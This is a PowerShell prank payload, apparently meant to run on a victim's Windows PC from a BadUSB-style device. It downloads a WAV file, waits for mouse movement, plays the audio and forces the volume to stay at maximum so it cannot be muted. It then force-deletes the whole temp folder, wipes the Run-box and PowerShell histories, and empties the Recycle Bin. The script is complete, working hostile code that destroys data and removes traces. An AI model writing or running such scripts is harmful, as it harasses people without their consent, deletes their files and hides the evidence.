#this is a much worse version of V1 in that the user cannot mute the audio file playing as it will be locked at 100 for the entire duration. to stop audio close the powershell window if you can find it in time (:
$wav = "https://github.com/MajorMarmalade/Sounds/raw/refs/heads/main/Arabic%20Surprise%20(Unstoppable)/The%20Weeknd%20-%20Blinding%20lights.wav?raw=true"

# Prepare the WAV file URL for download
$w = -join($wav, "?dl=1")
iwr $w -O $env:TMP\s.wav

# Load necessary assemblies for media playback and system utilities
Add-Type -AssemblyName PresentationCore
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")

Add-Type -AssemblyName System.Windows.Forms

# Record the original mouse position
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Wait for mouse movement
while ($true) {
    if ([System.Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
    Start-Sleep -Milliseconds 100
}

# Start a 20-second countdown after detecting mouse movement
Start-Sleep -Seconds 20

# Play the WAV file
$mediaPlayer.Play()

function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0; $i -lt $k; $i++) {
        $o.SendKeys([char]175)
    }
}

# Continuously raise volume and check playback status
while ($mediaPlayer.Position -lt $mediaPlayer.NaturalDuration.TimeSpan) {
    Raise-Volume
    Start-Sleep -Milliseconds 200
}

# Cleanup tasks: Delete contents of Temp folder, run box history, PowerShell history, and recycle bin contents
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
